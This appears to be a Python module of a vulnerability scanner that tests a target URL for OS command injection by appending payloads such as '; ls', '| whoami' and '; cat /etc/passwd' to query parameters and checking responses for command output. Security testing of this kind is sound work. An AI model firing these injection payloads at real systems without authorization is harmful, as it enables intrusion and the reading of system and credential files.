import requests
from .base import AttackModule
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CommandInjectionModule(AttackModule):
    name = "Command Injection"
    description = "Detecta vulnerabilidades de injeção de comandos OS"
    severity = "critical"
    
    def run(self, target: str) -> dict:
        session = requests.Session()
        session.verify = False
        headers = {'User-Agent': 'AttackSim/1.0'}
        
        # Payloads de command injection
        cmd_payloads = [
            ("; ls", "bin"),
            ("| ls", "bin"),
            ("&& ls", "bin"),
            ("`ls`", "bin"),
            ("$(ls)", "bin"),
            ("; whoami", "root"),
            ("| whoami", "root"),
            ("; cat /etc/passwd", "root:x:0:0"),
            ("| cat /etc/passwd", "root:x:0:0"),
        ]
        
        results = []
        
        for payload, indicator in cmd_payloads[:5]:
            try:
                if '?' in target and '=' in target:
                    base, param = target.split('?', 1)
                    param_name, value = param.split('=', 1)
                    test_url = f"{base}?{param_name}={payload}"
                else:
                    test_url = f"{target}?cmd={payload}"
                
                response = session.get(test_url, headers=headers, timeout=10)
                content = response.text
                
                if indicator in content:
                    results.append({
                        "payload": payload,
                        "evidence": f"Command output detected: '{indicator}'",
                        "confidence": "high"
                    })
                    
            except:
                continue
        
        if results:
            return {
                "success": True,
                "severity": "critical",
                "details": f"🎯 Found {len(results)} command injection points!",
                "findings": results[:3],
                "remediation": "Never pass user input to system commands. Use allowlists."
            }
        
        return {
            "success": False,
            "severity": "info",
            "details": "No command injection vulnerabilities detected"
        }
